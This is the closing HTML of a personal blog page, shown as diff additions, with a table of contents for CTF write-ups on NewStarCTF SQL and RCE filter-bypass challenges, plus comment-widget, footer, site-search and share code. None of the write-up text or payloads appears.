+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#newstarctf-2023-web-week3-midsql_sql"><span class="toc-text"> [NewStarCTF 2023] web week3 midsql_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newstarctf-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93so-baby-rce"><span class="toc-text"> [NewStarCTF 公开赛赛道]So Baby RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF"><span class="toc-text"> 空格代替</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%86%85%E5%AE%B9"><span class="toc-text"> 读取内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text"> 加特殊字符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text"> 编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-text"> 拼接绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-text"> 通配符绕过</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <!-- Giscus 评论区：基于 GitHub Discussions -->
+  <div class="giscus"></div>
+  <script src="https://giscus.app/client.js"
+          data-repo="x2nn/x2nn.github.io"
+          data-repo-id="R_kgDOMV-gkA"
+          data-category="Announcements"
+          data-category-id="DIC_kwDOMV-gkM4C7iiE"
+          data-mapping="pathname"
+          data-strict="0"
+          data-reactions-enabled="1"
+          data-emit-metadata="0"
+          data-input-position="top"
+          data-theme="preferred_color_scheme"
+          data-lang="zh-CN"
+          data-loading="lazy"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+  <!-- 跟随站点 light/dark 动态切换 Giscus 主题 -->
+  <script>
+    (function () {
+      function currentMode() {
+        return document.documentElement.getAttribute('color-mode') === 'dark' ? 'dark' : 'light';
+      }
+      function postTheme() {
+        var frame = document.querySelector('iframe.giscus-frame');
+        if (!frame) return;
+        frame.contentWindow.postMessage(
+          { giscus: { setConfig: { theme: currentMode() } } },
+          'https://giscus.app'
+        );
+      }
+      new MutationObserver(postTheme).observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['color-mode']
+      });
+    })();
+  </script>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2026</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2024%2F07%2F14%2FCTF%25E5%2581%259A%25E9%25A2%2598%25E8%25AE%25B0%25E5%25BD%2595%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
